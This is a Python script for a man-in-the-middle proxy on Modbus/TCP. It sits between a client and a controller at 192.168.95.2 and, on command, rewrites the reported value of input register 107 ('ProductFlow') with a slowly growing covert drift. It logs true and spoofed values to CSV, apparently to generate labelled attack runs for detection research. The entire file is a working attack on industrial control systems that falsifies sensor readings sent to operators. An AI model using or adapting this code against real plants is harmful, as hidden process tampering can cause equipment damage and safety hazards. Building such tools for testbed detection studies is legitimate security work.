import socket, struct, threading, time, csv, datetime, os, sys

LISTEN = ("0.0.0.0", 502)
TARGET = ("192.168.95.2", 502)
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

SIG_PROD = 0.07179686
RATE_SIGMA_PER_SEC = float(sys.argv[1]) if len(sys.argv) > 1 else 0.15
DRIFT_RATE_REAL_PER_SEC = RATE_SIGMA_PER_SEC * SIG_PROD

attack = {"active": False, "start_time": None}
log_rows = []

def recvn(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf

def recv_frame(sock):
    hdr = recvn(sock, 7)
    if hdr is None:
        return None
    length = struct.unpack(">H", hdr[4:6])[0]
    body = recvn(sock, length - 1)
    return hdr + (body or b"")

def raw_to_real(raw, real_max):
    return raw * real_max / 65535

def real_to_raw(real, real_max):
    real = max(0.0, min(real_max, real))   # clamp, avoid wraparound at the extremes
    return int(round(real * 65535 / real_max))

def maybe_rewrite(req, resp):
    if not attack["active"]:
        return resp
    if req[7] != 4:
        return resp
    start = struct.unpack(">H", req[8:10])[0]
    count = struct.unpack(">H", req[10:12])[0]
    if not (start <= 107 < start + count):
        return resp

    elapsed = time.time() - attack["start_time"]
    drift_real = DRIFT_RATE_REAL_PER_SEC * elapsed

    pos = 9 + (107 - start) * 2
    true_raw = struct.unpack(">H", resp[pos:pos+2])[0]
    true_real = raw_to_real(true_raw, 500)
    spoofed_real = true_real + drift_real
    spoofed_raw = real_to_raw(spoofed_real, 500)

    resp = bytearray(resp)
    resp[pos:pos+2] = struct.pack(">H", spoofed_raw & 0xFFFF)

    log_rows.append([datetime.datetime.utcnow().isoformat(), round(elapsed, 2),
                      true_raw, spoofed_raw, round(drift_real, 4)])
    return bytes(resp)

def handle(client):
    up = socket.create_connection(TARGET)
    try:
        while True:
            req = recv_frame(client)
            if req is None:
                break
            up.sendall(req)
            resp = recv_frame(up)
            if resp is None:
                break
            resp = maybe_rewrite(req, resp)
            client.sendall(resp)
    finally:
        client.close(); up.close()

def serve():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(LISTEN); s.listen(1)
    print("proxy up on", LISTEN, "->", TARGET)
    while True:
        c, _ = s.accept()
        threading.Thread(target=handle, args=(c,), daemon=True).start()

if __name__ == "__main__":
    threading.Thread(target=serve, daemon=True).start()
    time.sleep(0.5)

    print(f"drift rate = {DRIFT_RATE_REAL_PER_SEC:.6f} real flow units/sec "
          f"({DRIFT_RATE_REAL_PER_SEC/SIG_PROD:.3f} sigma/sec)")

    input("Press Enter to START covert drift on ProductFlow (107)...")
    onset = datetime.datetime.utcnow().isoformat()
    attack["start_time"] = time.time()
    attack["active"] = True
    print("ATTACK ACTIVE at", onset)

    input("Press Enter to STOP the attack...")
    attack["active"] = False
    offset = datetime.datetime.utcnow().isoformat()
    print("ATTACK STOPPED at", offset)
    RUN_ID = sys.argv[2] if len(sys.argv) > 2 else f"drift_{RATE_SIGMA_PER_SEC:.3f}"
    log_path = f"/app/data/attack_log_{RUN_ID}.csv"
    with open(log_path, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["timestamp_utc", "elapsed_sec", "true_raw", "spoofed_raw", "drift_real"])
        w.writerows(log_rows)

    meta_path = f"/app/data/{RUN_ID}_meta.csv"
    with open(meta_path, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["run_id", "rate_sigma_per_sec", "onset_utc", "offset_utc", "tampered_rows"])
        w.writerow([RUN_ID, RATE_SIGMA_PER_SEC, onset, offset, len(log_rows)])

    print(f"onset={onset} offset={offset}, {len(log_rows)} tampered responses logged")
    print(f"log written to {log_path} and {meta_path}")